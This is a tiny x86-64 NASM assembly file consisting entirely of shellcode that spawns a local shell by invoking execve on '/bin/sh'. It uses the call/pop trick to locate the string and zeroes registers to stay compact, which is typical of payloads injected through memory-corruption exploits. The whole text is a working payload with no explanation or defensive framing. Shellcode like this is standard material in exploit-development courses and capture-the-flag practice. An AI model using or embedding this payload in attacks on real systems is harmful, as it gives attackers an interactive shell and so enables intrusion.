bits 64

SYS_execve  equ 59

xor rax, rax
mov al, SYS_execve
call LULZ
db "/bin/sh", 0
LULZ:
pop rdi
xor rsi, rsi
xor rdx, rdx
syscall

